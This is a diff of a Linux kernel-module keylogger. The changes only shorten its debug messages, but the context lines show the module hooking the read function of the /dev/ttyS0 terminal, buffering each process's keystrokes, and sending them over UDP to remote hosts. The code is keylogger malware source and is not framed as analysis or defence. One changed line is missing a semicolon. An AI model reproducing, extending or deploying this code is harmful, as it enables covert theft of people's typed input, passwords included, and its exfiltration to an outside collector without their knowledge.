@@ -48,7 +48,7 @@ void insert_host(struct sockaddr_in *addr) {
 
 	struct host_node *host = kmalloc(sizeof(struct host_node), GFP_KERNEL);
 
-	debug("[ insert_host ] HOST ADDRESS TO INSERT (%pI4)", &addr->sin_addr.s_addr);
+	debug("HOST ADDRESS TO INSERT (%pI4)", &addr->sin_addr.s_addr);
 
 	/* create new socket */
 	if(sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &host->sock) < 0) {
@@ -56,7 +56,7 @@ void insert_host(struct sockaddr_in *addr) {
 		return;
     }
 
-    debug("[ insert_host ] CREATED SOCKET (%pI4, UDP)", &addr->sin_addr.s_addr);
+    debug("CREATED SOCKET (%pI4, UDP)", &addr->sin_addr.s_addr);
 
     /* set addr and port */
     memcpy(&host->addr, addr, sizeof(struct sockaddr_in));
@@ -65,7 +65,7 @@ void insert_host(struct sockaddr_in *addr) {
     /* connect to syslog-ng server */
     if(host->sock->ops->connect(host->sock, (struct sockaddr *)&host->addr, sizeof(struct sockaddr), 0) < 0) {
 
-    	alert("[ insert_host ] SOCKET CONNECT FAILED")
+    	alert("SOCKET CONNECT FAILED")
 
 		sock_release(host->sock);
 		host->sock = NULL;
@@ -73,9 +73,8 @@ void insert_host(struct sockaddr_in *addr) {
     	return;
     }
 
-    debug("[ insert_host ] SOCKET CONNECT (READY TO SEND)");
-
-	debug("[ insert_host ] INSERT HOST ADDRESS %pI4", &addr->sin_addr.s_addr);
+    debug("SOCKET CONNECT (READY TO SEND)");
+	debug("INSERT HOST ADDRESS %pI4", &addr->sin_addr.s_addr);
 
     /* insert in host node list */
 	insert_data_node(&hosts, (void *)host);
@@ -93,14 +92,14 @@ void remove_host(struct sockaddr_in *addr) {
 
 	if(host != NULL) {
 
-		debug("[ remove_host ] REMOVE HOST ADDRESS %pI4", &addr->sin_addr.s_addr);
+		debug("REMOVE HOST ADDRESS %pI4", &addr->sin_addr.s_addr);
 
 		release_socket(host);
 
 		return;
 	}
 
-	debug("[ remove_host ] HOST ADDRESS %pI4 NOT FOUND IN LIST", &addr->sin_addr.s_addr);
+	debug("HOST ADDRESS %pI4 NOT FOUND IN LIST", &addr->sin_addr.s_addr);
 }
 
 void flush_buffer_node(int pid, struct buff_node *node) {
@@ -119,7 +118,7 @@ struct data_node *insert_buff(int pid) {
 
 	struct buff_node *node = kmalloc(sizeof(struct buff_node), GFP_KERNEL);
 
-	debug("[ insert_buff ] INSERT BUFFER FOR PROCESS %d", pid);
+	debug("INSERT BUFFER FOR PROCESS %d", pid);
 
 	node->pid = pid;
 
@@ -136,7 +135,7 @@ void buffer_prepare_send(struct buff_node *bnode) {
 
 		struct host_node *hnode = (struct host_node *)host->data;
 
-		debug("[ buffer_prepare_send ] SEND MESSAGE TO %pI4, %d", &hnode->addr.sin_addr.s_addr, SYS_PORT);
+		debug("SEND MESSAGE TO %pI4, %d", &hnode->addr.sin_addr.s_addr, SYS_PORT);
 
 		udp_server_send(hnode->sock, &hnode->addr, bnode->udp_buffer, bnode->index);
 
@@ -233,7 +232,7 @@ ssize_t fake_read(struct file *filp, char __user *buff, size_t count, loff_t *of
 
 int network_keylogger_init(void) {
 
-	debug("[ network_keylogger_init ] INITIALIZING KEYLOGGER");
+	debug("INITIALIZING KEYLOGGER");
 
 	/* open tty to hook read function */
 	file = filp_open("/dev/ttyS0", O_RDONLY, 0);
@@ -261,7 +260,7 @@ int network_keylogger_init(void) {
 
 void network_keylogger_exit(void) {
 
-	debug("[ network_keylogger_exit ] EXIT KEYLOGGER");
+	debug("EXIT KEYLOGGER");
 
 	/* clear buffer list */
     free_data_node_list(&buffers);
